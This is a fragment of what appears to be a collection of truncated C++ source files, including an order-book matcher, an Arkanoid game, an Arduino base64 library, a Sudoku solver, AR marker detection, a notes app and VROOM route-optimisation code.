:\n    OrderModify(OrderID orderID, Side side, Price price, Quantity quantity)\n        : orderID_{ orderID }\n        , price_{ price }\n        , side_{ side }\n        , quantity_{ quantity }\n    { }\n\n    OrderID GetOrderID() const { return orderID_; }\n    Side GetSide() const { return side_; }\n    Price GetPrice() const { return price_; }\n    Quantity GetQuantity() const { return quantity_; }\n\n    OrderPointer ToOrderPointer( OrderType type  ) const\n    {\n        return std::make_shared<Order>(type, GetOrderID(), GetSide(), GetPrice(), GetQuantity());\n    }\n\nprivate:\n    OrderID orderID_;\n    Price price_;\n    Side side_;\n    Quantity quantity_;\n};\n\n\nstruct TradeInfo //interface for tthe trade\n{\n    OrderID orderID_;\n    Price price_;\n    Quantity quantity_;\n};\n\nclass Trade // aggreaation of bid and ask sides.\n{\npublic:\n    Trade (const TradeInfo& bidTrade, const TradeInfo& askTrade)\n        : bidTrade_ {bidTrade}\n        , askTrade_ {askTrade}\n    { }\n\n    const TradeInfo& GetBidTrade() const { return bidTrade_; }\n    const TradeInfo& GetAskTrade() const { return askTrade_; }\n\nprivate:\n    TradeInfo bidTrade_;\n    TradeInfo askTrade_;\n\n\n};\n\n\nusing Trades = std::vector<Trade>;\n\nclass Orderbook\n{\nprivate:\n    //using a map for bids (in descending from best bid ) and ask (ascending for best ask) we can have O(N) access . \n    // order iterator for its location \n    struct OrderEntry\n    {\n        OrderPointer order_{ nullptr };\n        OrderPointers::iterator location_;\n\n    };\n\n\n    std::map<Price, OrderPointers, std::greater<Price>> bids_;\n    std::map<Price, OrderPointers, std::less<Price>> asks_;\n    std::unordered_map<OrderID, OrderEntry> orders_;\n\n    //match methods\n    // so we add an order, if its not f&k we add to the list, else if it doesnt match , we discard instantly\n\n    bool CanMatch(Side side, Price price) const\n    {\n        if (side == Side::Buy)\n        {\n            if (asks_.empty())\n                return false;\n\n            const auto& [bestAsk, _] = *asks_.begin();\n            return price >= bestAsk;\n        }\n        else\n        {\n            if (bids_.empty())\n                return false;\n\n            const auto& [bestBid, _] = *bids_.begin();\n            return price <= bestBid;\n        }\n    }\n\n    Trades MatchOrders()\n    {\n        Trades trades;\n        trades.reserve(orders_.size());\n\n        while (true)\n        {\n            if (bids_.empty() || asks_.empty())\n                break;\n\n            auto& [bidPrice, bids] = *bids_.begin();\n            auto& [askPrice, asks] = *asks_.begin();\n\n            if (bidPrice < askPrice)\n                break;\n\n            while (!bids.empty() && !asks.empty())\n            {\n                auto bid = bids.front();\n                auto as",
    "#include \"Game.h\"\n\nGame::Game() : window(VideoMode(WIDTH, HEIGHT), \"Arkanoid Game\") {\n    window.setFramerateLimit(60);\n    font.loadFromFile(\"fonts/arial.ttf\");\n\n    t1.loadFromFile(\"images/BackG.png\");\n    t2.loadFromFile(\"images/ball.png\");\n    t3.loadFromFile(\"images/paddle.png\");\n    t4.loadFromFile(\"images/heart.png\");\n\n    FPaddle.setSize(Vector2f(520, 9));\n    FPaddle.setPosition(0, 440);\n    FPaddle.setFillColor(Color(226, 238, 245));\n\n    sBackG.setTexture(t1);\n    sBall.setTexture(t2);\n    sPaddle.setTexture(t3);\n\n    sPaddle.setPosition(230, 440);\n    sBall.setPosition(250, 200);\n\n    b1.loadFromFile(\"images/B01.png\");\n    b2.loadFromFile(\"images/B02.png\");\n    b3.loadFromFile(\"images/B03.png\");\n    b4.loadFromFile(\"images/B04.png\");\n    b5.loadFromFile(\"images/B05.png\");\n\n    initGame();\n}\n\nvoid Game::play() {\n    started = filmy = change = bonusActive = false;\n    Adhesion = 0;\n    while (window.isOpen()) {\n        processEvents();\n        if (started) update();\n        render();\n    }\n}\n\n\nvoid Game::initGame() {\n    for (int i = 0; i <= 11; i++) {\n        for (int j = 0; j <= 9; j++)\n        {\n            Vector2f position(i * 43 + 2, j * 20);\n            Vector2f size(42, 19);\n\n            int number = rand() % 10 - 2;\n            if (number < 1) number = 1;\n\n            Color color;\n            int randValue = rand() % 100;\n            if (randValue > 95) {\n                color = Color(64, 134, 68);          //\u00c1\u00eb\u00ee\u00ea\u00e8, \u00f3\u00e2\u00e5\u00eb\u00e8\u00f7\u00e8\u00e2\u00e0\u00fe\u00f9\u00e8\u00e5 \u00f1\u00ea\u00ee\u00f0\u00ee\u00f1\u00f2\u00fc \u00f8\u00e0\u00f0\u00e8\u00ea\u00e0\n                number = 1;\n            }\n            else if (randValue > 85) {\n                color = Color(90, 100, 105);         //\u00cd\u00e5\u00f0\u00e0\u00e7\u00f0\u00f3\u00f8\u00e0\u00e5\u00ec\u00fb\u00e5 \u00e1\u00eb\u00ee\u00ea\u00e8\n            }\n            else {\n                color = Color(165, 110, 188);       //\u00c1\u00eb\u00ee\u00ea\u00e8 \u00e8\u00ec\u00e5\u00fe\u00f2 \u00f3\u00f0\u00ee\u00e2\u00e5\u00ed\u00fc \u00e7\u00e4\u00ee\u00f0\u00ee\u00e2\u00fc\u00ff\n            }\n\n            Block block(position, size, color, number, font);\n            blocks.push_back(block);\n\n            randValue = rand() % 100;\n            int type;\n            Sprite bonus;\n            if (randValue > 90) {\n                bonus.setTexture(b1);\n                type = 1;\n            }\n            else if (randValue > 80) {\n                bonus.setTexture(b2);\n                type = 2;\n            }\n            else if (randValue > 70) {\n                bonus.setTexture(b3);\n                type = 3;\n            }\n            else if (randValue > 60) {\n                bonus.setTexture(b4);\n                type = 4;\n            }\n            else if (randValue > 50) {\n                bonus.setTexture(b5);\n                type = 5;\n            }\n            else {\n                bonus.setTexture(b5);\n                type = 0;\n            }\n            bonus.setPosition(i * 43 + 2, j * 20);\n            Bonus b(bonus, type);\n            Bonuses.push_back(b);\n        }\n    }\n\n    BlocksLeft = blocks.size();\n    for (int i = 0; i < numberLives; i++) {\n        Sprite heart(t4);\n        heart.setPosition(i * 22 + 80, 465);\n        sHearts.push_back(heart);\n    }\n\n    textLives.setFont(font);\n    textLives.setCharacterSize(24);\n    textLives.setFillColor(Color::White);\n    textLives.setPosition(10, 460);\n    textLives.setString(\"Lives: \");\n\n    textScores.setFont(font);\n    textScores.setCharacterSize(24);\n    textScores.setFillColor(Color::White);\n    textScores.setPosition(200, 460);\n\n    message.setFont(font);\n    message.setCharacterSize(50);\n    message.setFillColor(Color::White);\n    message.setPosition(180, 200);\n    message.setString(\"Start\");\n\n    bonusText.setFont(font);\n    bonusText.setCharacterSize(24);\n    bonusText.setFillColor(Color::White);\n    bonusText.setPosition(350, 460);\n}\n\nvoid Game::update() {\n    float elapsedTime = bonusClock.getElapsedTime().asSeconds();\n    //\u00d3 \u00e1\u00ee\u00ed\u00f3\u00f1\u00ee\u00e2 \u00ee\u00e3\u00f0\u00e0\u00ed\u00e8\u00f7\u00e5\u00ed\u00e8\u00e5 \u00ef\u00ee \u00e2\u00f0\u00e5\u00ec\u00e5\u00ed\u00e8(\u00ec\u00e5\u00ed\u00ff\u00fe\u00f2 \u00ef\u00f0\u00e8\u00eb\u00e8\u00ef\u00e0\u00ed\u00e8\u00e5 \u00f8\u00e0\u00f0\u00e8\u00ea\u00e0 \u00ea \u00ea\u00e0\u00f0\u00e5\u00f2\u00ea\u00e5 \u00e8 \u00f8\u00e0\u00f0\u00e8\u00ea \u00e2 \u00ef\u00f0\u00ee\u00e8\u00e7\u00e2\u00ee\u00eb\u00fc\u00ed\u00fb\u00e9 \u00ec\u00ee\u00ec\u00e5\u00ed\u00f2 \u00ec\u00e5\u00ed\u00ff\u00e5\u00f2 \u00f2\u00f0\u00e0\u00e5\u00ea\u00f2\u00ee\u00f0\u00e8\u00fe)\n    if (elapsedTime > bonusDuration) {\n        Adhesion = 0;\n        change = false;\n    }\n    else if (Adhesion > 0 || change == true) {\n        bonusText.setString(\"Time: \" + std::to_string(static_cast<int>(bonusDuration - elapsedTime)));\n    }\n\n    // \u00c1\u00ee\u00ed\u00f3\u00f1: \u00ec\u00e5\u00ed\u00ff\u00fe\u00f2 \u00ef\u00f0\u00e8\u00eb\u00e8\u00ef\u00e0\u00ed\u00e8\u00e5 \u00f8\u00e0\u00f0\u00e8\u00ea\u00e0 \u00ea \u00ea\u00e0\u00f0\u00e5\u00f2\u00ea\u00e5\n    if (Adhesion == 2) {\n        if (Keyboard::isKeyPressed(Keyboard::Right)) {\n            sPaddle.move(6, 0);\n            if (sPaddle.getGlobalBounds().left + sPaddle.getGlobalBounds().width > WIDTH) {\n                sPaddle.setPosition(WIDTH - sPaddle.getGlobalBounds().width, sPaddle.getPosition().y);\n            }\n            else x += 6;\n        }\n        if (Keyboard::isKeyPressed(Keyboard::Left)) {\n            sPaddle.move(-6, 0);\n            if (sPaddle.getGlobalBounds().left < 0) {\n                sPaddle.setPosition(0, sPaddle.getPosition().y);\n            }\n            else x -= 6;\n        }\n        if (Keyboard::isKeyPressed(Keyboard::Enter)) Adhesion = 1;\n    }\n    else {\n        x += dBall * cos(angleBall * PI / 180);\n        y += dBall * sin(angleBall * PI / 180);\n\n        // \u00c1\u00ee\u00ed\u00f3\u00f1: \u00f8\u00e0\u00f0\u00e8\u00ea \u00e2 \u00ef\u00f0\u00ee\u00e8\u00e7\u00e2\u00ee\u00eb\u00fc\u00ed\u00fb\u00e9 \u00ec\u00ee\u00ec\u00e5\u00ed\u00f2 \u00ec\u00e5\u00ed\u00ff\u00e5\u00f2 \u00f2\u00f0\u00e0\u00e5\u00ea\u00f2\u00ee\u00f0\u00e8\u00fe.\n        if (change) {\n      ",
    "/*\n * Copyright (c) 2013 Adam Rudd.\n * See LICENSE for more information\n * https://github.com/adamvr/arduino-base64 \n */\n#if (defined(__AVR__))\n#include <avr\\pgmspace.h>\n#else\n#include <pgmspace.h>\n#endif\n\nconst char PROGMEM b64_alphabet[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\t\t\"abcdefghijklmnopqrstuvwxyz\"\n\t\t\"0123456789+/\";\n\n/* 'Private' declarations */\ninline void a3_to_a4(unsigned char * a4, unsigned char * a3);\ninline void a4_to_a3(unsigned char * a3, unsigned char * a4);\ninline unsigned char b64_lookup(char c);\n\nint base64_encode(char *output, char *input, int inputLen) {\n\tint i = 0, j = 0;\n\tint encLen = 0;\n\tunsigned char a3[3];\n\tunsigned char a4[4];\n\n\twhile(inputLen--) {\n\t\ta3[i++] = *(input++);\n\t\tif(i == 3) {\n\t\t\ta3_to_a4(a4, a3);\n\n\t\t\tfor(i = 0; i < 4; i++) {\n\t\t\t\toutput[encLen++] = pgm_read_byte(&b64_alphabet[a4[i]]);\n\t\t\t}\n\n\t\t\ti = 0;\n\t\t}\n\t}\n\n\tif(i) {\n\t\tfor(j = i; j < 3; j++) {\n\t\t\ta3[j] = '\\0';\n\t\t}\n\n\t\ta3_to_a4(a4, a3);\n\n\t\tfor(j = 0; j < i + 1; j++) {\n\t\t\toutput[encLen++] = pgm_read_byte(&b64_alphabet[a4[j]]);\n\t\t}\n\n\t\twhile((i++ < 3)) {\n\t\t\toutput[encLen++] = '=';\n\t\t}\n\t}\n\toutput[encLen] = '\\0';\n\treturn encLen;\n}\n\nint base64_decode(char * output, char * input, int inputLen) {\n\tint i = 0, j = 0;\n\tint decLen = 0;\n\tunsigned char a3[3];\n\tunsigned char a4[4];\n\n\n\twhile (inputLen--) {\n\t\tif(*input == '=') {\n\t\t\tbreak;\n\t\t}\n\n\t\ta4[i++] = *(input++);\n\t\tif (i == 4) {\n\t\t\tfor (i = 0; i <4; i++) {\n\t\t\t\ta4[i] = b64_lookup(a4[i]);\n\t\t\t}\n\n\t\t\ta4_to_a3(a3,a4);\n\n\t\t\tfor (i = 0; i < 3; i++) {\n\t\t\t\toutput[decLen++] = a3[i];\n\t\t\t}\n\t\t\ti = 0;\n\t\t}\n\t}\n\n\tif (i) {\n\t\tfor (j = i; j < 4; j++) {\n\t\t\ta4[j] = '\\0';\n\t\t}\n\n\t\tfor (j = 0; j <4; j++) {\n\t\t\ta4[j] = b64_lookup(a4[j]);\n\t\t}\n\n\t\ta4_to_a3(a3,a4);\n\n\t\tfor (j = 0; j < i - 1; j++) {\n\t\t\toutput[decLen++] = a3[j];\n\t\t}\n\t}\n\toutput[decLen] = '\\0';\n\treturn decLen;\n}\n\nint base64_enc_len(int plainLen) {\n\tint n = plainLen;\n\treturn (n + 2 - ((n + 2) % 3)) / 3 * 4;\n}\n\nint base64_dec_len(char * input, int inputLen) {\n\tint i = 0;\n\tint numEq = 0;\n\tfor(i = inputLen - 1; input[i] == '='; i--) {\n\t\tnumEq++;\n\t}\n\n\treturn ((6 * inputLen) / 8) - numEq;\n}\n\ninline void a3_to_a4(unsigned char * a4, unsigned char * a3) {\n\ta4[0] = (a3[0] & 0xfc) >> 2;\n\ta4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);\n\ta4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);\n\ta4[3] = (a3[2] & 0x3f);\n}\n\ninline void a4_to_a3(unsigned char * a3, unsigned char * a4) {\n\ta3[0] = (a4[0] << 2) + ((a4[1] & 0x30) >> 4);\n\ta3[1] = ((a4[1] & 0xf) << 4) + ((a4[2] & 0x3c) >> 2);\n\ta3[2] = ((a4[2] & 0x3) << 6) + a4[3];\n}\n\ninline unsigned char b64_lookup(char c) {\n\tif(c >='A' && c <='Z') return c - 'A';\n\tif(c >='a' && c <='z') return c - 71;\n\tif(c >='0' && c <='9') return c + 4;\n\tif(c == '+') return 62;\n\tif(c == '/') return 63;\n\treturn -1;\n}",
    "#include <iostream>\n\nusing namespace std;\n\n// A Sudoku board is a 9x9 grid of integers\nconst int N = 9;\n\n// Check if a number is valid in a given row, column, and box\nbool isValid(int board[N][N], int row, int col, int num) {\n  // Check row\n  for (int i = 0; i < N; i++) {\n    if (board[row][i] == num) {\n      return false;\n    }\n  }\n\n  // Check column\n  for (int i = 0; i < N; i++) {\n    if (board[i][col] == num) {\n      return false;\n    }\n  }\n\n  // Check box\n  int boxRow = row / 3;\n  int boxCol = col / 3;\n  for (int i = boxRow * 3; i < boxRow * 3 + 3; i++) {\n    for (int j = boxCol * 3; j < boxCol * 3 + 3; j++) {\n      if (board[i][j] == num) {\n        return false;\n      }\n    }\n  }\n\n  // If we reach here, the number is valid\n  return true;\n}\n\n// Solve the Sudoku board using backtracking\nbool solve(int board[N][N]) {\n  // Find the next empty cell\n  int row, col;\n  for (row = 0; row < N; row++) {\n    for (col = 0; col < N; col++) {\n      if (board[row][col] == 0) {\n        // Try all possible numbers for this cell\n        for (int num = 1; num <= N; num++) {\n          if (isValid(board, row, col, num)) {\n            // Place the number in the cell and recursively solve the rest of the board\n            board[row][col] = num;\n            if (solve(board)) {\n              return true;\n            }\n            // If the board cannot be solved with this number, backtrack and try the next number\n            board[row][col] = 0;\n          }\n        }\n        // If we reach here, there is no solution for this board\n        return false;\n      }\n    }\n  }\n\n  // If we reach here, the board is solved\n  return true;\n}\n\n// Print the Sudoku board\nvoid printBoard(int board[N][N]) {\n  for (int i = 0; i < N; i++) {\n    for (int j = 0; j < N; j++) {\n      cout << board[i][j] << \" \";\n    }\n    cout << endl;\n  }\n}\n\nint main() {\n  // Create a Sudoku board\n  int board[N][N] = {\n    {0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0} \n  };\n\n  // Solve the board\n  if (solve(board)) {\n    // Print the solution\n    printBoard(board);\n  } else {\n    // The board cannot be solved\n    cout << \"No solution found\" << endl;\n  }\n\n  return 0;\n}",
    "/*\n * This file is part of ALVAR, A Library for Virtual and Augmented Reality.\n *\n * Copyright 2007-2012 VTT Technical Research Centre of Finland\n *\n * Contact: VTT Augmented Reality Team <alvar.info@vtt.fi>\n *          <http://www.vtt.fi/multimedia/alvar.html>\n *\n * ALVAR is free software; you can redistribute it and/or modify it under the\n * terms of the GNU Lesser General Public License as published by the Free\n * Software Foundation; either version 2.1 of the License, or (at your option)\n * any later version.\n *\n * This library is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n * FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License\n * for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License\n * along with ALVAR; if not, see\n * <http://www.gnu.org/licenses/old-licenses/lgpl-2.1.html>.\n */\n\n#include \"ar_track_alvar/MarkerDetector.h\"\n\ntemplate class ALVAR_EXPORT alvar::MarkerDetector<alvar::Marker>;\ntemplate class ALVAR_EXPORT alvar::MarkerDetector<alvar::MarkerData>;\ntemplate class ALVAR_EXPORT alvar::MarkerDetector<alvar::MarkerArtoolkit>;\n\nusing namespace std;\n\nnamespace alvar\n{\nMarkerDetectorImpl::MarkerDetectorImpl()\n{\n  SetMarkerSize();\n  SetOptions();\n  labeling = NULL;\n}\n\nMarkerDetectorImpl::~MarkerDetectorImpl()\n{\n  if (labeling)\n    delete labeling;\n}\n\nvoid MarkerDetectorImpl::TrackMarkersReset()\n{\n  _track_markers_clear();\n}\n\nvoid MarkerDetectorImpl::TrackMarkerAdd(int id, PointDouble corners[4])\n{\n  Marker* mn = new_M(edge_length, res, margin);\n  if (map_edge_length.find(id) != map_edge_length.end())\n  {\n    mn->SetMarkerSize(map_edge_length[id], res, margin);\n  }\n\n  mn->SetId(id);\n  mn->marker_corners_img.clear();\n  mn->marker_corners_img.push_back(corners[0]);\n  mn->marker_corners_img.push_back(corners[1]);\n  mn->marker_corners_img.push_back(corners[2]);\n  mn->marker_corners_img.push_back(corners[3]);\n  _track_markers_push_back(mn);\n  delete mn;\n}\n\nvoid MarkerDetectorImpl::SetMarkerSize(double _edge_length, int _res,\n                                       double _margin)\n{\n  edge_length = _edge_length;\n  res = _res;\n  margin = _margin;\n  map_edge_length.clear();  // TODO: Should we clear these here?\n}\n\nvoid MarkerDetectorImpl::SetMarkerSizeForId(unsigned long id,\n                                            double _edge_length)\n{\n  map_edge_length[id] = _edge_length;\n}\n\nvoid MarkerDetectorImpl::SetOptions(bool _detect_pose_grayscale)\n{\n  detect_pose_grayscale = _detect_pose_grayscale;\n}\n\nint MarkerDetectorImpl::Detect(cv::Mat& image, Camera* cam, bool track,\n                               bool visualize, double max_new_marker_error,\n                               double max_track_error,\n                               LabelingMethod labeling_method, bool update_pose)\n{\n  double error = -1;\n\n  // Swap marker tables\n  _swap_marker_tables();\n  _markers_clear();\n\n  switch (labeling_method)\n  {\n    case CVSEQ:\n\n      if (!labeling)\n        labeling = new LabelingCvSeq();\n      ((LabelingCvSeq*)labeling)->SetOptions(detect_pose_grayscale);\n      break;\n  }\n\n  labeling->SetCamera(cam);\n  labeling->LabelSquares(image, visualize);\n  vector<vector<PointDouble> >& blob_corners = labeling->blob_corners;\n  cv::Mat gray = labeling->gray;\n\n  int orientation;\n\n  // When tracking we find the best matching blob and test if it is near enough?\n  if (track)\n  {\n    for (size_t ii = 0; ii < _track_markers_size(); ii++)\n    {\n      Marker* mn = _track_markers_at(ii);\n      if (mn->GetError(Marker::DECODE_ERROR | Marker::MARGIN_ERROR) > 0)\n        continue;  // We track only perfectly decoded markers\n      int track_i = -1;\n      int track_orientation = 0;\n      double track_error = 1e200;\n      for (unsigned i = 0; i < blob_corners.size() /*blobs_ret.size()*/; ++i)\n      {\n        if (blob_corners[i].empty())\n          continue;\n        mn->CompareCorners(blob_corners[i], &orientation, &error);\n        if (error < track_error)\n        {\n          track_i = i;\n          track_orientation = orientation;\n          track_error = error;\n        }\n      }\n      if (track_error <= max_track_error)\n      {\n        mn->SetError(Marker::DECODE_ERROR, 0);\n        mn->SetError(Marker::MARGIN_ERROR, 0);\n        mn->SetError(Marker::TRACK_ERROR, track_error);\n        mn->UpdateContent(blob_corners[track_i], gray,\n                          cam);  // Maybe should only do this when kinect is\n                                 // being used? Don't think it hurts anything...\n        mn->UpdatePose(blob_corners[track_i], cam, track_orientation,\n                       update_pose);\n        _markers_push_back(mn);\n        blob_corners[track_i].clear();  // We don't want to handle this again...\n        if (visualize)\n          mn->Visualize(image, cam, CV_RGB(255, 255, 0));\n      }\n    }\n  }\n\n  // Now we go through the rest of the blobs -- in case there are new markers...\n  for (size_t i = 0; i <",
    "/*\n * Copyright (c) 2011-2015 BlackBerry Limited.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"applicationui.hpp\"\n\n#include <bb/cascades/Application>\n\n#include <QLocale>\n#include <QTranslator>\n\n#include <Qt/qdeclarativedebug.h>\n\nusing namespace bb::cascades;\n\nQ_DECL_EXPORT int main(int argc, char **argv)\n{\n    Application app(argc, argv);\n\n    // Create the Application UI object, this is where the main.qml file\n    // is loaded and the application scene is set.\n    ApplicationUI appui;\n\n    // Enter the application main event loop.\n    return Application::exec();\n}\n",
    "#include <stdlib.h>\n#include <string.h>\n\n#include <vector>\n\nusing namespace std;\n\n/*********************Attmept 1********************/\n\nclass Solution {\n public:\n  int numUniqueEmails(vector<string>& emails) {\n    // Convert all emails to correct format\n    int numEmails = emails.size();\n    for (int i = 0; i < numEmails; i++) {\n      int sizeString = emails[i].size();\n      string curr = emails[i];\n      for (int j = 0; j < sizeString; j++) {\n        if (curr[j] == '.' || curr[j] == '+') {\n          curr[j] = '\\0';\n        }\n      }\n\n      for (int j = 0; j < sizeString; j++) {\n        if (curr[j] == '\\0' && j < sizeString - 1) {\n          bool shift = true;\n          int k = j;\n          if (k + 1 < sizeString) {\n            while (shift) {\n              if (k + 1 < sizeString) {\n                curr[k] = curr[k + 1];\n                if (k + 1 == sizeString) curr[k + 1] = '\\0';\n              } else\n                shift = false;\n            }\n          }\n        }\n      }\n      emails[i] = curr;\n    }\n\n    // Count unique addresses\n    int unique = 0;\n    for (int i = 0; i < numEmails; i++) {\n      bool duplicate = false;\n      string curr = emails[i];\n      for (int j = 0; j < numEmails; j++) {\n        if (j != i) {\n          if (curr == emails[j]) duplicate = true;\n        }\n      }\n      if (!duplicate) unique++;\n    }\n    return unique;\n  }\n};\n\n// Function is too complex so it exceeds time limit\n\n/*********************End of Attmept 1********************/\n",
    "#include <iostream>\n#include <filesystem>\n#include <fstream>\n#include <sstream>\n#include \"PublicNote.hpp\"\n#include \"PrivateNote.hpp\"\n#include \"utils.hpp\"\n#include \"Note.hpp\"\n#include \"json.hpp\"\n\nusing json = nlohmann::json;\nusing namespace std;\n\n// overwrite metadata function, takes one single note and it is ALWAYS PRIVATE\nvoid overwriteMetadata(Note* note) {\n    ifstream inFile(\"metadata.json\");\n    json metadata;\n    inFile >> metadata;\n\n    string content = note->getContent();\n    vector<string> tokens = tokenize(content);\n    unordered_map<string, int> wordFrequency;\n    string key;\n\n    for (const string& token : tokens) wordFrequency[token]++;\n    key = getFolderName(FolderType::PRIVATE) + \"/\" + note->getHeading() + \".txt\";\n    metadata[key] = wordFrequency;\n\n    ofstream outFile(\"metadata.json\");\n    outFile << metadata.dump(2);\n    outFile.close();\n    inFile.close();\n}\n\nvector<NoteAndWordsInfo*> loadMetadata() {\n    ifstream file(\"metadata.json\"); // ifstream means input file stream\n    json metadata; // object from json's class\n    file >> metadata;\n\n    vector<NoteAndWordsInfo*> notes_available;\n    for (auto& [key, value] : metadata.items()) {\n        string heading = key.substr(key.find_last_of(\"/\") + 1); // Extract the heading from the key\n        heading = heading.substr(0, heading.find(\".txt\")); // Remove the file extension\n        FolderType type = key.find(\"public\") != string::npos ? FolderType::PUBLIC : FolderType::PRIVATE;  // npos means not found\n        unordered_map<string, int> wordFrequencies;\n        for (auto& [word, frequency] : value.items()) wordFrequencies[word] = frequency;\n        NoteAndWordsInfo* noteHeadingAndType = new NoteAndWordsInfo{heading, type, wordFrequencies};\n        notes_available.push_back(noteHeadingAndType);\n    }\n\n    vector<FolderType> dirTypes = {FolderType::PUBLIC, FolderType::PRIVATE};\n    for (const FolderType& type : dirTypes) {\n        string dir = \"notes/\" + getFolderName(type);\n        for (const auto& entry : filesystem::directory_iterator(dir)) {\n            string filename = entry.path().filename();\n            string heading = filename.substr(0, filename.find(\".txt\"));\n            string key = getFolderName(type) + \"/\" + filename; // private/FileName.txt\n            \n            if (!metadata.contains(key)) {\n                cout << \"Generating metadata for note: \" << heading << endl; \n                unordered_map<string, int> wordFrequency;\n                Note* note = loadNoteFromHeadingInDirectory(dir, heading);\n                for (string& token : tokenize(note->getContent())) wordFrequency[token]++;\n                delete note;\n                metadata[key] = wordFrequency;\n                notes_available.push_back(new NoteAndWordsInfo{heading, type, wordFrequency});\n            }\n        }\n    }\n    ofstream outFile(\"metadata.json\");\n    outFile << metadata.dump(2);\n    outFile.close();\n    file.close();\n    return notes_available;\n}\n\n\nint main() {\n    /*\n    1. No need of creating public/private notes vectors.\n    2. Load metadata from metadata.json file and populate notes_available vector.\n    3. Use notes_available vector to display notes and search notes.\n    4. Create, modify and delete notes using the notes_available vector.\n    5. Update metadata.json file after creating, modifying and deleting notes.\n    */\n//  just read the metadata file\n//  confirm if all notes in directory are present in metadata file\n    vector <NoteAndWordsInfo*> notes_available = loadMetadata();\n    cout << \"==================================\"<<endl;\n    cout << \"Initialization Successful\"<<endl;\n    cout << \"==================================\"<<endl;\n    cout << \"\\nWelcome to ASE!\\n\";\n\n    // TODO: Write a small summary of the tool and what it does, alots of COUT\n    char choice;\n    do {\n        cout << \"\\nHow may I help you?\\n\";\n        cout << \"1. Search \\n\";\n        cout << \"2. Show all notes \\n\";\n        cout << \"3. Add new note\\n\";\n        cout << \"4. Edit notes\\n\";\n        cout << \"5. Remove notes\\n\";\n        cout << \"6. Print note\\n\";\n        cout << \"7. Exit\\n\";\n        cout << \"Your choice (1-7): \";\n        cin >> choice;\n        cout << endl;\n\n        // the user input is stored in choice\n        // switch statement- executes different code blocks according to values of choice variable\n\n        // cin.ignore() - to ignore or discard characters in the input stream - \\n \n        // <iostream> header (STL lib)\n        // cin reads input from buffer until it encounters white space char , user does the \\n command to subit their input\n        // it remains as buffer so when you will use cin again, it will interpret the \\n as input causing unexpected behaviour\n\n        // getline takes input (cin) and puts it in query, also no input buffer of \\n so we don't have to use cin.ignore() after\n        // <string> header\n        // searchNotes function- private_notes vector and query string\n\n        switch (choice) {\n            case '1': {\n                s",
    "/*\n\nThis file is part of VROOM.\n\nCopyright (c) 2015-2024, Julien Coupey.\nAll rights reserved (see LICENSE).\n\n*/\n\n#include <algorithm>\n#include <iterator>\n#include <numeric>\n#include <thread>\n#include <unordered_map>\n\n#include \"problems/tsp/heuristics/local_search.h\"\n#include \"utils/helpers.h\"\n\nnamespace vroom::tsp {\n\nLocalSearch::LocalSearch(const Matrix<UserCost>& matrix,\n                         std::pair<bool, Index> avoid_start_relocate,\n                         const std::list<Index>& tour,\n                         unsigned nb_threads)\n  : _matrix(matrix),\n    _avoid_start_relocate(std::move(avoid_start_relocate)),\n    _edges(_matrix.size()),\n    _nb_threads(std::min(nb_threads, static_cast<unsigned>(tour.size()))),\n    _rank_limits(_nb_threads) {\n  // Build _edges vector representation.\n  auto location = tour.cbegin();\n  Index first_index = *location;\n  Index last_index = first_index;\n  ++location;\n  while (location != tour.cend()) {\n    Index current_index = *location;\n    _edges[last_index] = current_index;\n    last_index = current_index;\n    ++location;\n  }\n  _edges[last_index] = first_index;\n\n  // Build a vector of bounds that easily split the [0, _edges.size()]\n  // look-up range 'evenly' between threads for relocate and or-opt\n  // operator.\n  std::size_t range_width = _edges.size() / _nb_threads;\n  std::iota(_rank_limits.begin(), _rank_limits.end(), 0);\n  std::transform(_rank_limits.begin(),\n                 _rank_limits.end(),\n                 _rank_limits.begin(),\n                 [range_width](std::size_t v) { return range_width * v; });\n  // Shifting the limits to dispatch remaining ranks among more\n  // threads for a more even load balance. This way the load\n  // difference between ranges should be at most 1.\n  std::size_t remainder = _edges.size() % _nb_threads;\n  std::size_t shift = 0;\n  for (std::size_t i = 1; i < _rank_limits.size(); ++i) {\n    if (shift < remainder) {\n      ++shift;\n    }\n    _rank_limits[i] += shift;\n  }\n  _rank_limits.push_back(_edges.size());\n\n  // Build a vector of bounds that easily split the [0, _edges.size()]\n  // look-up range 'evenly' between threads for 2-opt symmetric\n  // operator.\n  _sym_two_opt_rank_limits.reserve(_nb_threads + 1);\n  _sym_two_opt_rank_limits.push_back(0);\n\n  if (_nb_threads > 1) {\n    // When avoiding duplicate tests in two-opt (symmetric case), the\n    // first choice for edge_1 requires number_of_lookups[0] checks\n    // for edge_2, the next requires number_of_lookups[1] and so\n    // on. If several threads are used, splitting the share between\n    // them is based on this workload.\n\n    std::vector<unsigned> number_of_lookups(_edges.size() - 1);\n    number_of_lookups[0] = _edges.size() - 3;\n    std::iota(number_of_lookups.rbegin(), number_of_lookups.rend() - 1, 0);\n\n    std::vector<unsigned> cumulated_lookups;\n    std::partial_sum(number_of_lookups.begin(),\n                     number_of_lookups.end(),\n                     std::back_inserter(cumulated_lookups));\n\n    unsigned total_lookups = _edges.size() * (_edges.size() - 3) / 2;\n    unsigned thread_lookup_share = total_lookups / _nb_threads;\n\n    Index rank = 0;\n    for (std::size_t i = 1; i < _nb_threads; ++i) {\n      // Finding nodes that separate current tour in _nb_threads ranges.\n      while 